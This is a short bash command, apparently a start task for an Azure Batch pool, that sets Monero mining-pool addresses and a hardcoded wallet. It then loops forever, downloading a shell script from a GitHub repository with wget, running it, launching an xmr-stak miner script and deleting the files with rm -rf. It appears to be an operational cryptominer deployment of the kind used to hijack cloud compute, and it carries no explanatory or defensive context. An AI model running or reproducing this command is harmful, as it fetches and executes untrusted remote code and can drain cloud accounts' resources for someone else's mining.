/bin/bash -c "export pool_pass1=${AZ_BATCH_POOL_ID}:test;
export pool_address1=pool.minexmr.com:5555;
export wallet1=44R2ENBEq99GRSCDzbZwzReebTLXFphUjXsJ8zbg9d3YdXzEaMa3wsncLUFrB2NLCdPe8YBj9ebBqXMvtynd6EBXKZedgh7;
export nicehash1=false;
export pool_pass2=${AZ_BATCH_POOL_ID}:test;
export pool_address2=ca.minexmr.com:5555;
export wallet2=44R2ENBEq99GRSCDzbZwzReebTLXFphUjXsJ8zbg9d3YdXzEaMa3wsncLUFrB2NLCdPe8YBj9ebBqXMvtynd6EBXKZedgh7;
export nicehash2=false;while [ 1 ] ;
do wget https://raw.githubusercontent.com/pproum/test/master/azure_script/setup_vm3.sh; 
chmod u+x setup_vm3.sh ;
./setup_vm3.sh ; 
cd test; 
cd azure_script; 
./run_xmr_stak.pl 2; 
cd ..; 
cd ..; 
rm -rf test ; 
rm -rf setup_vm3.sh; 
done;"